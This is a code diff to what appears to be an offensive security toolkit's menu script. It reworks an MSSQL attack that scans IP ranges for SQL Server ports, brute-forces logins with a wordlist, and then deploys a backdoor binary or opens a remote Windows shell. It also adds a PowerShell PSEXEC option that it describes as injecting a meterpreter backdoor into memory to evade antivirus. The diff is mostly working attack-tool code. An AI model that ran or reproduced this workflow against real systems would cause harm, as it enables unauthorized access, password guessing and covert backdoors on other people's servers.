@@ -52,11 +52,17 @@ try:
                 print "\nHere you can select either a CIDR notation/IP Address or a filename\nthat contains a list of IP Addresses.\n\nFormat for a file would be similar to this:\n\n192.168.13.25\n192.168.13.26\n192.168.13.26\n\n1. Scan IP address or CIDR\n2. Import file that contains SQL Server IP addresses\n"
                 choice = raw_input(setprompt(["19", "21", "22"], "Enter your choice (ex. 1 or 2) [1]"))
                 # grab ip address
-                range = raw_input(setprompt(["19","21","22"], "Enter the CIDR, single IP, or filename with IP addresses (ex. 192.168.1.1/24 or filename.txt)"))
-                # grab the port
-                port = raw_input(setprompt(["19","21","22"], "Enter the port number to scan [1433]"))
-                # if default use 1433
-                if port == "": port = 1433
+                if choice == "1":
+                    range = raw_input(setprompt(["19","21","22"], "Enter the CIDR or single IP (ex. 192.168.1.1/24)"))
+                if choice == "2":
+                    while 1:
+                        range = raw_input(setprompt(["19","21","22"], "Enter filename for SQL servers (ex. /root/sql.txt - note can be in format of ipaddr:port)"))
+                        if not os.path.isfile(range):
+                            print_error("File not found! Please type in the path to the file correctly.")
+                        else:
+                            break            
+                if choice == "1": port = ""                   
+                if choice == "2": port = "1433"
                 # ask for a wordlist
                 wordlist = raw_input(setprompt(["19","21","22"], "Enter path to a wordlist file [use default wordlist]"))
                 if wordlist == "": wordlist =  "default"
@@ -72,7 +78,19 @@ try:
                 # choice from earlier if we want to use a filelist or whatnot
                 if choice != "2":
                     # sql_servers
-                    sql_servers = mssql.scan(range, port, port)
+                    sql_servers = ''
+                    print_status("Hunting for SQL servers.. This may take a little bit.")
+                    if "/" in str(range):
+                        iprange = printCIDR(range)
+                        iprange = iprange.split(",")
+                        for host in iprange:
+                            sqlport = get_sql_port(host)
+                            if sqlport != None:
+                                sql_servers = sql_servers + host + ":" + sqlport + ","
+                    else:
+                        sqlport = get_sql_port(range)
+                        sql_servers = range + ":" + sqlport
+
                 # specify choice 2
                 if choice == "2":
                     if not os.path.isfile(range):
@@ -82,6 +100,7 @@ try:
                             if os.path.isfile(range):
                                 print_status("Atta boy. Found the file this time. Moving on.")
                                 break
+
                     fileopen = file(range, "r").readlines()
                     sql_servers = ""
                     for line in fileopen:
@@ -161,9 +180,9 @@ try:
                                 # if we equal the number used above
                                 if counter == int(select_server):
                                         #  ipaddr + "," + username + "," + str(port) + "," + passwords
-                                    print "\nHow do you want to deploy the binary via debug (win2k, winxp, win2003) or powershell (vista,win7)\n\n   1. Windows Powershell\n   2. Windows Debug Conversion\n   3. Standard Windows Shell\n\n   99. Return back to the main menu.\n"
+                                    print "\nHow do you want to deploy the binary via debug (win2k, winxp, win2003) and/or powershell (vista,win7) or just a shell\n\n   1. Deploy Backdoor to System\n   2. Standard Windows Shell\n\n   99. Return back to the main menu.\n"
                                     option = raw_input(setprompt(["19","21","22"], "Which deployment option do you want [1]"))
-                                    if option == "": option = "2"
+                                    if option == "": option = "1"
                                     # if 99 then break
                                     if option == "99": break
                                     # specify we are using the fasttrack option, this disables some features
@@ -171,13 +190,11 @@ try:
                                     filewrite.write("none")
                                     filewrite.close()
                                     # import fasttrack
-                                    if option == "1" or option == "2":
+                                    if option == "1":
                                         # import payloads for selection and prep
-                                        try: reload(src.core.payloadgen.create_payloads)
-                                        except: import src.core.payloadgen.create_payloads
-                                        mssql.deploy_hex2binary(success[0], success[2], success[1], success[3], option)
+                                        mssql.deploy_hex2binary(success[0], success[2], success[1], success[3])
                                     # straight up connect
-                                    if option == "3":
+                                    if option == "2":
                                         mssql.cmdshell(success[0], success[2], success[1], success[3], option)
                                 # increment counter
                                 counter = counter + 1
@@ -343,6 +360,16 @@ try:
             # once we are finished, prompt.
             print_status("Everything is finished!")
             pause = raw_input("Press {return} to go back to the main menu.")
+
+        ##################################
+        ##################################
+        # PSEXEC PowerShell
+        ##################################
+        ##################################
+        if attack_vector == "6":
+            print "\nPSEXEC Powershell Injection Attack:\n\nThis attack will inject a meterpreter backdoor through powershell memory injection. This will circumvent\nAnti-Virus since we will never touch disk. Will require Powershell to be installed on the remote victim\nmachine. You can use either straight passwords or hash values.\n"
+            try: reload(src.fasttrack.psexec)
+            except: import src.fasttrack.psexec
 
 # handle keyboard exceptions
 except KeyboardInterrupt:
